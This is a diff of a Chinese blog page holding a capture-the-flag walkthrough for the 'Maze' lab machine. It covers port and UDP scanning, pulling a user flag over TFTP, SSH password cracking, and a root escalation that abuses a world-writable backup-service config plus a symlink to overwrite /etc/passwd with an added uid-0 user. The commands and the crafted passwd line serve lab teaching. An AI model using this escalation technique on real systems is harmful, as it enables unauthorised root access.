@@ -102,7 +102,7 @@ Nmap done: 1 IP address (1 host up) scanned in 1.05 seconds
 <meta property="og:url" content="https://7r1UMPHK.github.io/post/nei-bu-_Maze.html">
 <meta property="og:image" content="https://7r1UMPHK.github.io/image/20251025224622174.webp">
 <title>内部_Maze</title>
-<link href="//unpkg.com/@wooorm/starry-night@2.1.1/style/both.css" rel="stylesheet" />
+
 
 
 </head>
@@ -171,18 +171,19 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
 <div class="markdown-body" id="postBody"><h1>一、信息收集</h1>
 <h2>主机发现</h2>
 <p>使用<code class="notranslate">arp-scan</code>扫描局域网内的主机：</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
 └─$ sudo arp-scan -l
 ...
 192.168.205.158 08:00:27:55:48:f5       PCS Systemtechnik GmbH
-...</pre></div>
+...
+</code></pre>
 <p>发现目标主机：<code class="notranslate">192.168.205.158</code></p>
 <h2>端口扫描</h2>
 <p>对目标主机进行全端口TCP扫描：</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
 └─$ nmap -p0-65535 192.168.205.158
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-04 11:31 GMT
-Nmap scan report <span class="pl-k">for</span> 192.168.205.158
+Nmap scan report for 192.168.205.158
 Host is up (0.00011s latency).
 Not shown: 65534 closed tcp ports (reset)
 PORT   STATE SERVICE
@@ -190,7 +191,8 @@ PORT   STATE SERVICE
 80/tcp open  http
 MAC Address: 08:00:27:55:48:F5 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
 
-Nmap done: 1 IP address (1 host up) scanned <span class="pl-k">in</span> 1.05 seconds</pre></div>
+Nmap done: 1 IP address (1 host up) scanned in 1.05 seconds
+</code></pre>
 <p>开放端口：</p>
 <ul>
 <li>22/tcp: SSH服务</li>
@@ -201,13 +203,14 @@ Nmap done: 1 IP address (1 host up) scanned <span class="pl-k">in</span> 1.05 se
 <p>访问Web首页发现是靶场介绍页面，识别出CMS为Grav 1.7.48。虽然该版本存在RCE漏洞，但需要登录权限，而admin登录页面无法访问，因此该攻击路径不可行。</p>
 <h3>UDP端口扫描</h3>
 <p>对常用UDP端口进行扫描：</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
 └─$ nmap -sU --top-port 200 192.168.205.158
 ...
 PORT   STATE         SERVICE
-68/udp open<span class="pl-k">|</span>filtered dhcpc
-69/udp open<span class="pl-k">|</span>filtered tftp
-...</pre></div>
+68/udp open|filtered dhcpc
+69/udp open|filtered tftp
+...
+</code></pre>
 <p>发现TFTP服务运行在69/udp端口。</p>
 <div class="markdown-alert markdown-alert-tip"><p class="markdown-alert-title"><svg class="octicon octicon-light-bulb mr-2" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="M8 1.5c-2.363 0-4 1.69-4 3.75 0 .984.424 1.625.984 2.304l.214.253c.223.264.47.556.673.848.284.411.537.896.621 1.49a.75.75 0 0 1-1.484.211c-.04-.282-.163-.547-.37-.847a8.456 8.456 0 0 0-.542-.68c-.084-.1-.173-.205-.268-.32C3.201 7.75 2.5 6.766 2.5 5.25 2.5 2.31 4.863 0 8 0s5.5 2.31 5.5 5.25c0 1.516-.701 2.5-1.328 3.259-.095.115-.184.22-.268.319-.207.245-.383.453-.541.681-.208.3-.33.565-.37.847a.751.751 0 0 1-1.485-.212c.084-.593.337-1.078.621-1.489.203-.292.45-.584.673-.848.075-.088.147-.173.213-.253.561-.679.985-1.32.985-2.304 0-2.06-1.637-3.75-4-3.75ZM5.75 12h4.5a.75.75 0 0 1 0 1.5h-4.5a.75.75 0 0 1 0-1.5ZM6 15.25a.75.75 0 0 1 .75-.75h2.5a.75.75 0 0 1 0 1.5h-2.5a.75.75 0 0 1-.75-.75Z"></path></svg>Tip</p>
 <p><a href="https://book.hacktricks.wiki/zh/network-services-pentesting/69-udp-tftp.html#69---udp-tftp" rel="nofollow">https://book.hacktricks.wiki/zh/network-services-pentesting/69-udp-tftp.html#69---udp-tftp</a></p>
@@ -221,21 +224,23 @@ tftp&gt;
 <p>连接成功，但TFTP不提供目录列表功能，需要手动猜测文件名。</p>
 <h2>文件枚举</h2>
 <p>通过手动测试常见文件名：</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
+<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
 └─$ tftp 192.168.205.158
-tftp<span class="pl-k">&gt;</span> get id_rsa
+tftp&gt; get id_rsa
 Error code 1: File not found
-tftp<span class="pl-k">&gt;</span> get passwd
+tftp&gt; get passwd
 Error code 1: File not found
-tftp<span class="pl-k">&gt;</span> get secret
+tftp&gt; get secret
 Error code 1: File not found
-tftp<span class="pl-k">&gt;</span> get user.txt</pre></div>
+tftp&gt; get user.txt
+</code></pre>
 <p>成功获取到<code class="notranslate">user.txt</code>文件：</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
+<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
 └─$ cat user.txt                                               
 flag{user-4e79af9d9b43464228ae1100839a2575}
 username:bamuwe
-need:bruteforce</pre></div>
+need:bruteforce
+</code></pre>
 <p>获得关键信息：</p>
 <ul>
 <li>User flag: <code class="notranslate">flag{user-4e79af9d9b43464228ae1100839a2575}</code></li>
@@ -254,45 +259,50 @@ need:bruteforce</pre></div>
 <p>成功破解密码：<code class="notranslate">bamuwe:hahaha</code></p>
 <h1>四、初始访问</h1>
 <h2>SSH登录</h2>
-<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
 └─$ ssh bamuwe@192.168.205.158
-bamuwe@192.168.205.158<span class="pl-s"><span class="pl-pds">'</span>s password: </span>
-<span class="pl-s">...</span>
-<span class="pl-s">bamuwe@Maze:~$ </span></pre></div>
+bamuwe@192.168.205.158's password: 
+...
+bamuwe@Maze:~$ 
+</code></pre>
 <p>成功获取shell访问权限。</p>
 <h2>权限枚举</h2>
 <h3>基础信息收集</h3>
-<div class="highlight highlight-source-shell"><pre class="notranslate">bamuwe@Maze:<span class="pl-k">~</span>$ id
+<pre lang="bash" class="notranslate"><code class="notranslate">bamuwe@Maze:~$ id
 uid=1005(bamuwe) gid=1005(bamuwe) groups=1005(bamuwe)
 
-bamuwe@Maze:<span class="pl-k">~</span>$ sudo -l
+bamuwe@Maze:~$ sudo -l
 ...
-Sorry, user bamuwe may not run sudo on Maze.</pre></div>
+Sorry, user bamuwe may not run sudo on Maze.
+</code></pre>
 <p>用户无sudo权限。</p>
 <h3>SUID程序检查</h3>
-<div class="highlight highlight-source-shell"><pre class="notranslate">bamuwe@Maze:<span class="pl-k">~</span>$ find / -perm -4000 -type f -exec ls -l {} <span class="pl-cce">\;</span> <span class="pl-k">2&gt;</span>/dev/null
-...</pre></div>
+<pre lang="bash" class="notranslate"><code class="notranslate">bamuwe@Maze:~$ find / -perm -4000 -type f -exec ls -l {} \; 2&gt;/dev/null
+...
+</code></pre>
 <p>未发现可利用的SUID程序。</p>
 <h3>用户文件权限</h3>
-<div class="highlight highlight-source-shell"><pre class="notranslate">bamuwe@Maze:<span class="pl-k">~</span>$ find / -user <span class="pl-s"><span class="pl-pds">$(</span>whoami<span class="pl-pds">)</span></span> <span class="pl-k">!</span> -path <span class="pl-s"><span class="pl-pds">'</span>/proc/*<span class="pl-pds">'</span></span> <span class="pl-k">!</span> -path <span class="pl-s"><span class="pl-pds">'</span>/sys/*<span class="pl-pds">'</span></span> <span class="pl-k">!</span> -path <span class="pl-s"><span class="pl-pds">'</span>/run/*<span class="pl-pds">'</span></span> <span class="pl-k">2&gt;</span>/dev/null
+<pre lang="bash" class="notranslate"><code class="notranslate">bamuwe@Maze:~$ find / -user $(whoami) ! -path '/proc/*' ! -path '/sys/*' ! -path '/run/*' 2&gt;/dev/null
 ...
 /etc/modprobe.d
 /etc/modprobe.d/pwn.conf
-/etc/modprobe.d/get_root.conf</pre></div>
+/etc/modprobe.d/get_root.conf
+</code></pre>
 <p>发现用户对<code class="notranslate">/etc/modprobe.d/</code>目录下的配置文件有权限，但是没用sudo、suid、capabilities意义不大。</p>
 <h1>五、权限提升</h1>
 <h2>服务分析</h2>
 <p>在<code class="notranslate">/opt</code>目录下发现关键服务脚本：</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">bamuwe@Maze:/opt$ cat log_backup_service.py
-<span class="pl-c"><span class="pl-c">#!</span>/usr/bin/env python3</span>
+<pre lang="bash" class="notranslate"><code class="notranslate">bamuwe@Maze:/opt$ cat log_backup_service.py
+#!/usr/bin/env python3
 
 import os
 import json
-import <span class="pl-k">time</span>
+import time
 import shutil
 import logging
 from datetime import datetime
-...</pre></div>
+...
+</code></pre>
 <p>这是一个以root权限运行的日志备份服务，通过分析代码发现以下关键点：</p>
 <ol>
 <li>服务以root权限运行</li>
@@ -301,61 +311,69 @@ from datetime import datetime
 <li>文件名格式：<code class="notranslate">{backup_filename}.{timestamp}.bak</code></li>
 </ol>
 <h2>配置文件权限检查</h2>
-<div class="highlight highlight-source-shell"><pre class="notranslate">bamuwe@Maze:/opt$ ls -al /etc/log_backup_service/config.json
--rwxrwxrwx 1 root root 113 Aug 15 08:08 /etc/log_backup_service/config.json</pre></div>
+<pre lang="bash" class="notranslate"><code class="notranslate">bamuwe@Maze:/opt$ ls -al /etc/log_backup_service/config.json
+-rwxrwxrwx 1 root root 113 Aug 15 08:08 /etc/log_backup_service/config.json
+</code></pre>
 <p>我到这我就扒拉了一个<code class="notranslate">root.txt</code>交了，后面有空了，才扒拉拿shell。</p>
 <p>这个是可以实现任意文件写入的，当然要软连接，它规则写的挺死。</p>
-<div class="highlight highlight-source-python"><pre class="notranslate"><span class="pl-s1">archive_path</span> <span class="pl-c1">=</span> <span class="pl-s1">os</span>.<span class="pl-c1">path</span>.<span class="pl-c1">join</span>(<span class="pl-s1">backup_dest</span>, <span class="pl-s">f"<span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">backup_filename</span><span class="pl-kos">}</span></span>.<span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">timestamp</span><span class="pl-kos">}</span></span>.bak"</span>)</pre></div>
+<pre lang="python" class="notranslate"><code class="notranslate">archive_path = os.path.join(backup_dest, f"{backup_filename}.{timestamp}.bak")
+</code></pre>
 <p>聪明的小伙伴就会问了，我不能读shadow和ssh私钥吗，不巧root密码爆破不出来，ssh私钥和公钥对不上，无法利用。</p>
 <h2>提权利用</h2>
 <h3>1. 时间戳计算</h3>
 <p>先随便写入到一个文件看看时间戳</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">bamuwe@Maze:<span class="pl-k">~</span>/a$ cat /etc/log_backup_service/config.json
+<pre lang="bash" class="notranslate"><code class="notranslate">bamuwe@Maze:~/a$ cat /etc/log_backup_service/config.json
 {
-  <span class="pl-s"><span class="pl-pds">"</span>source_log_path<span class="pl-pds">"</span></span>: <span class="pl-s"><span class="pl-pds">"</span>/var/log/my_app.log<span class="pl-pds">"</span></span>,
-  <span class="pl-s"><span class="pl-pds">"</span>backup_dest<span class="pl-pds">"</span></span>: <span class="pl-s"><span class="pl-pds">"</span>/tmp/a/<span class="pl-pds">"</span></span>,
-  <span class="pl-s"><span class="pl-pds">"</span>run_as_user<span class="pl-pds">"</span></span>: <span class="pl-s"><span class="pl-pds">"</span>root<span class="pl-pds">"</span></span>
-}</pre></div>
+  "source_log_path": "/var/log/my_app.log",
+  "backup_dest": "/tmp/a/",
+  "run_as_user": "root"
+}
+</code></pre>
 <p>稍等片刻</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">bamuwe@Maze:<span class="pl-k">~</span>/a$ ls -la /tmp/a/
+<pre lang="bash" class="notranslate"><code class="notranslate">bamuwe@Maze:~/a$ ls -la /tmp/a/
 total 8
-drwxr-xr-x  2 root root 4096 Sep  4 07:55 <span class="pl-c1">.</span>
+drwxr-xr-x  2 root root 4096 Sep  4 07:55 .
 drwxrwxrwt 11 root root 4096 Sep  4 07:55 ..
--rw-r--r--  1 root root    0 Sep  4 07:55 my_app.log.20250904075549.bak</pre></div>
+-rw-r--r--  1 root root    0 Sep  4 07:55 my_app.log.20250904075549.bak
+</code></pre>
 <p>20250904 日期（固定）</p>
 <p>0755 时间（修改）</p>
 <p>49 秒（固定）</p>
 <p>填一个和你时间靠近的就好了</p>
 <h3>2.准备恶意passwd文件</h3>
-<div class="highlight highlight-source-shell"><pre class="notranslate">bamuwe@Maze:/tmp$ cp /etc/passwd passwd
+<pre lang="bash" class="notranslate"><code class="notranslate">bamuwe@Maze:/tmp$ cp /etc/passwd passwd
 bamuwe@Maze:/tmp$ vim passwd
 bamuwe@Maze:/tmp$ tail -n 1 passwd
-b:<span class="pl-smi">$1</span><span class="pl-smi">$AydoDDh4$tEky6m30</span>.0nY3HZ8FgoGI0:0:0::/root:/bin/bash</pre></div>
+b:$1$AydoDDh4$tEky6m30.0nY3HZ8FgoGI0:0:0::/root:/bin/bash
+</code></pre>
 <h3>3. 软链接攻击</h3>
-<div class="highlight highlight-source-shell"><pre class="notranslate">bamuwe@Maze:/tmp$ <span class="pl-c1">cd</span>
-bamuwe@Maze:<span class="pl-k">~</span>$ mkdir a
-bamuwe@Maze:<span class="pl-k">~</span>$ <span class="pl-c1">cd</span> a/
-bamuwe@Maze:<span class="pl-k">~</span>/a$ vim /etc/log_backup_service/config.json
-bamuwe@Maze:<span class="pl-k">~</span>/a$ cat /etc/log_backup_service/config.json
+<pre lang="bash" class="notranslate"><code class="notranslate">bamuwe@Maze:/tmp$ cd
+bamuwe@Maze:~$ mkdir a
+bamuwe@Maze:~$ cd a/
+bamuwe@Maze:~/a$ vim /etc/log_backup_service/config.json
+bamuwe@Maze:~/a$ cat /etc/log_backup_service/config.json
 {
-  <span class="pl-s"><span class="pl-pds">"</span>source_log_path<span class="pl-pds">"</span></span>: <span class="pl-s"><span class="pl-pds">"</span>/tmp/passwd<span class="pl-pds">"</span></span>,
-  <span class="pl-s"><span class="pl-pds">"</span>backup_dest<span class="pl-pds">"</span></span>: <span class="pl-s"><span class="pl-pds">"</span>/home/bamuwe/a/<span class="pl-pds">"</span></span>,
-  <span class="pl-s"><span class="pl-pds">"</span>run_as_user<span class="pl-pds">"</span></span>: <span class="pl-s"><span class="pl-pds">"</span>root<span class="pl-pds">"</span></span>
+  "source_log_path": "/tmp/passwd",
+  "backup_dest": "/home/bamuwe/a/",
+  "run_as_user": "root"
 }
-bamuwe@Maze:<span class="pl-k">~</span>/a$ ln -sf /etc/passwd passwd.20250904080149.bak</pre></div>
+bamuwe@Maze:~/a$ ln -sf /etc/passwd passwd.20250904080149.bak
+</code></pre>
 <p>当服务运行时，会将恶意的passwd文件内容写入到<code class="notranslate">/etc/passwd</code>，从而创建后门用户。</p>
 <h3>4. 切换到root权限</h3>
 <p>直接登录b就好了，密码<code class="notranslate">abcdefg</code></p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">bamuwe@Maze:<span class="pl-k">~</span>/a$ su b
+<pre lang="bash" class="notranslate"><code class="notranslate">bamuwe@Maze:~/a$ su b
 Password: 
 root@Maze:/home/bamuwe/a# id
-uid=0(root) gid=0(root) groups=0(root)</pre></div>
+uid=0(root) gid=0(root) groups=0(root)
+</code></pre>
 <h1>六、获取Flag</h1>
-<div class="highlight highlight-source-shell"><pre class="notranslate">root@Maze:/home/bamuwe/a# cat /root/root.txt /srv/tftp/user.txt
+<pre lang="bash" class="notranslate"><code class="notranslate">root@Maze:/home/bamuwe/a# cat /root/root.txt /srv/tftp/user.txt
 flag{root-6195bd8a9d755a41e493440a804f46d4}
 flag{user-4e79af9d9b43464228ae1100839a2575}
 username:bamuwe
-need:bruteforce</pre></div></div>
+need:bruteforce
+</code></pre></div>
 <div style="font-size:small;margin-top:8px;float:right;"></div>
 
 <button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
